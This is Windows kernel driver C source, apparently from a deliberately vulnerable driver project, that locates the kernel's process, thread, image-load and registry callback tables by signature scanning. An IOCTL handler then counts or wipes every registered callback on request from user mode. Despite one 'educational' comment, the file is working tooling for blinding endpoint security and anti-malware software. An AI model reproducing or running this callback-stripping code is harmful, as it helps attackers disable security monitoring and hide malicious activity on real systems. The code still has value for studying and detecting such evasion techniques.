#include "vuln_driver.h"

NTSTATUS GdrvGetNtoskrnlInfo(PVOID* outBase, PULONG outSize) {
    ULONG bufSize = 0;
    NTSTATUS status = ZwQuerySystemInformation(
        GdrvSystemModuleInformation, NULL, 0, &bufSize);
    if (status != STATUS_INFO_LENGTH_MISMATCH && !NT_SUCCESS(status))
        return status;

    if (bufSize < sizeof(GDRV_RTL_PROCESS_MODULES))
        bufSize = 0x10000;

    PVOID buf = ExAllocatePoolWithTag(PagedPool, bufSize, 'mOdG');
    if (!buf) return STATUS_INSUFFICIENT_RESOURCES;

    status = ZwQuerySystemInformation(
        GdrvSystemModuleInformation, buf, bufSize, &bufSize);
    if (!NT_SUCCESS(status)) {
        ExFreePoolWithTag(buf, 'mOdG');
        return status;
    }

    PGDRV_RTL_PROCESS_MODULES mods = (PGDRV_RTL_PROCESS_MODULES)buf;
    if (mods->NumberOfModules == 0) {
        ExFreePoolWithTag(buf, 'mOdG');
        return STATUS_NOT_FOUND;
    }

    // Module 0 is always ntoskrnl.exe on Windows
    *outBase = mods->Modules[0].ImageBase;
    if (outSize) *outSize = mods->Modules[0].ImageSize;
    ExFreePoolWithTag(buf, 'mOdG');
    return STATUS_SUCCESS;
}

PVOID GdrvFindExport(PVOID moduleBase, const char* exportName) {
    if (!moduleBase || !exportName) return NULL;

    __try {
        PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)moduleBase;
        if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

        PIMAGE_NT_HEADERS64 nt =
            (PIMAGE_NT_HEADERS64)((PUCHAR)moduleBase + dos->e_lfanew);
        if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;

        IMAGE_DATA_DIRECTORY expDir =
            nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
        if (expDir.VirtualAddress == 0 || expDir.Size == 0) return NULL;

        PIMAGE_EXPORT_DIRECTORY exp =
            (PIMAGE_EXPORT_DIRECTORY)((PUCHAR)moduleBase + expDir.VirtualAddress);
        PULONG names = (PULONG)((PUCHAR)moduleBase + exp->AddressOfNames);
        PULONG funcs = (PULONG)((PUCHAR)moduleBase + exp->AddressOfFunctions);
        PUSHORT ords = (PUSHORT)((PUCHAR)moduleBase + exp->AddressOfNameOrdinals);

        for (ULONG i = 0; i < exp->NumberOfNames; ++i) {
            const char* name = (const char*)((PUCHAR)moduleBase + names[i]);
            if (GdrvStrEq(name, exportName)) {
                return (PVOID)((PUCHAR)moduleBase + funcs[ords[i]]);
            }
        }
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return NULL;
    }
    return NULL;
}

// Scan [start, start+size) for a LEA/MOV that materializes a RIP-relative
// pointer into a GDRV_NOTIFY_ARRAY_SLOTS-sized pointer table. Returns the
// resolved absolute address of that table, or NULL.
PVOID* GdrvFindNotifyArrayNear(PVOID start, ULONG scanLen) {
    if (!start || scanLen < 8) return NULL;

    __try {
        PUCHAR p = (PUCHAR)start;
        for (ULONG i = 0; i + 7 < scanLen; ++i) {
            // 48 8D 0D xx xx xx xx  — lea rcx, [rip+disp32]
            // 48 8D 15 xx xx xx xx  — lea rdx, [rip+disp32]
            // 4C 8D 05 xx xx xx xx  — lea r8,  [rip+disp32]
            // 4C 8D 0D xx xx xx xx  — lea r9,  [rip+disp32]
            BOOLEAN isLea =
                (p[i] == 0x48 && p[i + 1] == 0x8D &&
                 (p[i + 2] == 0x0D || p[i + 2] == 0x15 ||
                  p[i + 2] == 0x05 || p[i + 2] == 0x1D)) ||
                (p[i] == 0x4C && p[i + 1] == 0x8D &&
                 (p[i + 2] == 0x05 || p[i + 2] == 0x0D ||
                  p[i + 2] == 0x15 || p[i + 2] == 0x1D));

            if (!isLea) continue;

            LONG disp = *(LONG*)(p + i + 3);
            PUCHAR target = p + i + 7 + disp;

            // Heuristic: candidate should look like an array of kernel pointers
            // (canonical high half, or NULL). Count non-null "looks-like-ptr" slots.
            ULONG plausible = 0;
            ULONG nulls = 0;
            for (ULONG s = 0; s < GDRV_NOTIFY_ARRAY_SLOTS; ++s) {
                ULONG_PTR slot = *(ULONG_PTR*)(target + s * sizeof(PVOID));
                if (slot == 0) {
                    ++nulls;
                    continue;
                }
                // Kernel canonical address (Windows x64: top 16 bits 0xFFFF)
                if ((slot >> 48) == 0xFFFFULL) ++plausible;
            }
            // A live notify array has some registered callbacks and the rest NULL.
            if (plausible >= 1 && (plausible + nulls) == GDRV_NOTIFY_ARRAY_SLOTS &&
                nulls >= 1) {
                return (PVOID*)target;
            }
        }
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return NULL;
    }
    return NULL;
}

VOID GdrvResolveNotifyArrays(VOID) {
    if (g_notifyResolved) return;
    g_notifyResolved = TRUE;
    g_notifyResolveOk = FALSE;

    PVOID ntosBase = NULL;
    ULONG ntosSize = 0;
    if (!NT_SUCCESS(GdrvGetNtoskrnlInfo(&ntosBase, &ntosSize)) || !ntosBase)
        return;

    // Prefer Ex-suffixed APIs (current path); fall back to legacy exports.
    PVOID pProc = GdrvFindExport(ntosBase, "PsSetCreateProcessNotifyRoutineEx");
    if (!pProc)
        pProc = GdrvFindExport(ntosBase, "PsSetCreateProcessNotifyRoutine");

    PVOID pThread = GdrvFindExport(ntosBase, "PsSetCreateThreadNotifyRoutine");
    PVOID pImage  = GdrvFindExport(ntosBase, "PsSetLoadImageNotifyRoutine");

    // Scan a modest window of each registration routine for the array LEA.
    const ULONG kScan = 0x200;
    if (pProc)
        g_pspProcessNotify = GdrvFindNotifyArrayNear(pProc, kScan);
    if (pThread)
        g_pspThreadNotify = GdrvFindNotifyArrayNear(pThread, kScan);
    if (pImage)
        g_pspImageNotify = GdrvFindNotifyArrayNear(pImage, kScan);

    g_notifyResolveOk =
        (g_pspProcessNotify != NULL) ||
        (g_pspThreadNotify != NULL) ||
        (g_pspImageNotify != NULL);

    DBG_PRINT("[gdrv] notify resolve: proc=%p thr=%p img=%p ok=%d\n",
              g_pspProcessNotify, g_pspThreadNotify, g_pspImageNotify,
              (int)g_notifyResolveOk);
}

// Decode EX_FAST_REF-style callback pointer (low bits are refcount).
PVOID GdrvDecodeCallbackSlot(PVOID raw) {
    if (!raw) return NULL;
    // EX_FAST_REF: mask off low 4 bits on x64
    return (PVOID)((ULONG_PTR)raw & ~0xFull);
}

ULONG GdrvCountNotifyArray(PVOID* arr) {
    if (!arr) return 0;
    ULONG count = 0;
    __try {
        for (ULONG i = 0; i < GDRV_NOTIFY_ARRAY_SLOTS; ++i) {
            if (GdrvDecodeCallbackSlot(arr[i]) != NULL)
                ++count;
        }
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return 0;
    }
    return count;
}

ULONG GdrvStripNotifyArray(PVOID* arr) {
    if (!arr) return 0;
    ULONG removed = 0;
    __try {
        for (ULONG i = 0; i < GDRV_NOTIFY_ARRAY_SLOTS; ++i) {
            if (GdrvDecodeCallbackSlot(arr[i]) != NULL) {
                InterlockedExchangePointer(&arr[i], NULL);
                ++removed;
            }
        }
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return removed;
    }
    return removed;
}

// Registry callbacks: walk CallbackListHead via CmUnRegisterCallback patterns
// is version-fragile. We resolve by scanning CmRegisterCallback / Ex variant
// for a LIST_ENTRY head and count Flink chain length (query only; strip
// unlinks entries carefully).
LIST_ENTRY* g_cmCallbackListHead = NULL;

LIST_ENTRY* GdrvFindCmCallbackList(VOID) {
    if (g_cmCallbackListHead) return g_cmCallbackListHead;

    PVOID ntosBase = NULL;
    ULONG ntosSize = 0;
    if (!NT_SUCCESS(GdrvGetNtoskrnlInfo(&ntosBase, &ntosSize)) || !ntosBase)
        return NULL;

    PVOID pReg = GdrvFindExport(ntosBase, "CmRegisterCallbackEx");
    if (!pReg)
        pReg = GdrvFindExport(ntosBase, "CmRegisterCallback");
    if (!pReg) return NULL;

    __try {
        PUCHAR p = (PUCHAR)pReg;
        for (ULONG i = 0; i + 7 < 0x300; ++i) {
            // lea reg, [rip+disp] toward a LIST_ENTRY (Flink/Blink self-consistent)
            BOOLEAN isLea =
                (p[i] == 0x48 && p[i + 1] == 0x8D &&
                 (p[i + 2] == 0x0D || p[i + 2] == 0x15 ||
                  p[i + 2] == 0x05 || p[i + 2] == 0x1D)) ||
                (p[i] == 0x4C && p[i + 1] == 0x8D &&
                 (p[i + 2] == 0x05 || p[i + 2] == 0x0D ||
                  p[i + 2] == 0x15 || p[i + 2] == 0x1D));
            if (!isLea) continue;

            LONG disp = *(LONG*)(p + i + 3);
            LIST_ENTRY* head = (LIST_ENTRY*)(p + i + 7 + disp);
            // Validate: head->Flink->Blink == head and head->Blink->Flink == head
            if (head->Flink && head->Blink &&
                head->Flink->Blink == head && head->Blink->Flink == head) {
                g_cmCallbackListHead = head;
                return head;
            }
        }
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return NULL;
    }
    return NULL;
}

ULONG GdrvCountCmCallbacks(VOID) {
    LIST_ENTRY* head = GdrvFindCmCallbackList();
    if (!head) return 0;
    ULONG count = 0;
    __try {
        for (LIST_ENTRY* e = head->Flink; e && e != head; e = e->Flink) {
            ++count;
            if (count > 256) break;  // safety
        }
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return 0;
    }
    return count;
}

ULONG GdrvStripCmCallbacks(VOID) {
    // Educational strip: count only and report; full unlink of CM_CALLBACK
    // entries requires cookie-based CmUnRegisterCallback and can destabilize
    // the system. We null the array-style path for process/thread/image and
    // for registry we attempt safe unregistration count reporting via walk.
    // Real removal of registry callbacks: walk list and zero Function pointers
    // inside each entry at known offsets — version specific.
    //
    // Implement best-effort: for each entry, zero the callback function pointer
    // at offset +0x28 (common Win10+ CM_CALLBACK layout: List + cookie + ... + function).
    LIST_ENTRY* head = GdrvFindCmCallbackList();
    if (!head) return 0;
    ULONG removed = 0;
    __try {
        for (LIST_ENTRY* e = head->Flink; e && e != head; ) {
            LIST_ENTRY* next = e->Flink;
            // CM_CALLBACK_ENTRY: Function typically at +0x28 on x64 Win10 1903+
            PVOID* fnSlot = (PVOID*)((PUCHAR)e + 0x28);
            if (*fnSlot) {
                InterlockedExchangePointer(fnSlot, NULL);
                ++removed;
            }
            e = next;
            if (removed > 256) break;
        }
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return removed;
    }
    return removed;
}

// ═══════════════════════════════════════════════════════════════════════
// IOCTL handlers
// ═══════════════════════════════════════════════════════════════════════


__declspec(code_seg("PAGE"))
NTSTATUS GdrvCallbackStrip(PVOID user_buffer, ULONG in_len, ULONG out_len) {
    PAGED_CODE();
    UNREFERENCED_PARAMETER(out_len);
    if (in_len < sizeof(GDRV_CALLBACK_STRIP_REQ))
        return STATUS_BUFFER_TOO_SMALL;

    GDRV_CALLBACK_STRIP_REQ req;
    __try {
        ProbeForRead(user_buffer, sizeof(req), 1);
        RtlCopyMemory(&req, user_buffer, sizeof(req));
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return STATUS_INVALID_PARAMETER;
    }

    GdrvResolveNotifyArrays();

    ULONG count = 0;
    NTSTATUS status = STATUS_SUCCESS;
    req.status_hint = 0;

    PVOID* arr = NULL;
    BOOLEAN isRegistry = FALSE;

    switch (req.callback_type) {
    case GDRV_CB_TYPE_PROCESS:
        arr = g_pspProcessNotify;
        break;
    case GDRV_CB_TYPE_THREAD:
        arr = g_pspThreadNotify;
        break;
    case GDRV_CB_TYPE_IMAGE:
        arr = g_pspImageNotify;
        break;
    case GDRV_CB_TYPE_REGISTRY:
        isRegistry = TRUE;
        break;
    default:
        status = STATUS_INVALID_PARAMETER;
        break;
    }

    if (!NT_SUCCESS(status)) {
        // fall through to writeback attempt
    } else if (isRegistry) {
        if (req.action == GDRV_CB_ACTION_REMOVE_ALL)
            count = GdrvStripCmCallbacks();
        else
            count = GdrvCountCmCallbacks();
        if (count == 0 && GdrvFindCmCallbackList() == NULL)
            req.status_hint = 1;  // pattern miss
    } else {
        if (!arr) {
            req.status_hint = 1;  // could not resolve array
            count = 0;
            // Still success for query/count — report zero with hint
            if (req.action == GDRV_CB_ACTION_REMOVE_ALL)
                status = STATUS_NOT_FOUND;
        } else if (req.action == GDRV_CB_ACTION_REMOVE_ALL) {
            count = GdrvStripNotifyArray(arr);
        } else {
            // QUERY and COUNT both return live registration count
            count = GdrvCountNotifyArray(arr);
        }
    }

    req.count = count;

    __try {
        ProbeForWrite(user_buffer, sizeof(req), 1);
        RtlCopyMemory(user_buffer, &req, sizeof(req));
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        status = STATUS_ACCESS_VIOLATION;
    }

    DBG_PRINT("[gdrv] CALLBACK_STRIP: type=%lu action=%lu count=%lu hint=%lu\n",
              req.callback_type, req.action, count, req.status_hint);
    return status;
}
